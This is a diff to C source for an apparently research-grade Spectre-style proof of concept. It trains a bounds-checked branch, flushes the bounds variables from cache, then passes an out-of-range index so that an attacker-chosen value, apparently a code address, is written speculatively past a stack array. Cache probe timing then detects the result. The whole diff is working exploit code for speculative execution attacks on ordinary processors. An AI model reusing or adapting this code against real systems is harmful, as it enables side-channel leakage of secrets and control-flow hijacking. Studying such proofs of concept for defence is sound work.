@@ -26,7 +26,7 @@ void end_target_fn(void);
  * e.g. 256 would be 1 byte of info Tradeoff here is larger bandwidth means 
  * we have to check more places in probe_buf (and flush them)
  */
-#define NUM_PROBES 1024
+//#define NUM_PROBES 256
 
 /*
  * These define the stride length we take between probes. This thwarts a 
@@ -99,14 +99,16 @@ void check_probes() {
 
 
 // Use Global instead of local for easier flushing?
-int __attribute__((section(".max_len"))) max_len = 43;
-int __attribute__((section(".max_len"))) min_len = 0;
+uint64_t __attribute__((section(".max_len"))) min_len = 0;
+uint64_t __attribute__((section(".max_len"))) max_len = 43;
 
-void branch(uint64_t* array, register entry, register index){
+
+void branch(register uint64_t entry, register uint64_t index){
+    uint64_t overflow[43];
     if ((index < max_len) && (index >= min_len)) {
-        array[index] = entry;
-        asm volatile (__signal(0x88):::"rax", "rcx", "rdx");
-        return;
+        //asm volatile (__signal(0x88):::"rax", "rcx", "rdx");
+        //target_fn();
+        overflow[index] = entry;
     }
     return;
 }
@@ -114,28 +116,26 @@ void branch(uint64_t* array, register entry, register index){
 void trick_branch(){
     int i=0;
     int training_rounds = 2000;
-    uint64_t overflow[43];
+    //uint64_t overflow[43];
     uint64_t good_val = 0xDEADBEEF12345678;
     uint64_t bad_val  = 0x0000000000434040;
 
     // memset(overflow, 0x44, sizeof(overflow));
     for (i=0; i< training_rounds; i++){
-        branch(overflow, good_val, i%43);
+        branch(good_val, i%43);
     }
-     
     _mm_clflush(&max_len);
     _mm_clflush(&min_len);
     flush_probe_buf_i();
 
-    branch(overflow, bad_val, -1);
-    // branch(overflow, bad_val, 49);
+    branch(bad_val, 44);
 }
 
 void measure() {
     int i, j;
 
     int misses = 0;
-    uint64_t k = 2;
+    uint64_t k = 1;
     uint64_t width = 8;
     uint64_t top_k_i[k]; 
     uint64_t top_k_res[k]; 
@@ -148,7 +148,10 @@ void measure() {
             // train_branch();
             // _mm_clflush(&max_len);
             trick_branch();
+            //target_fn();
+            //asm volatile (__signal(0x88):::"rax", "rcx", "rdx");
             check_probes();
+            usleep(10);
         }
 
         uint64_t avg = 0;
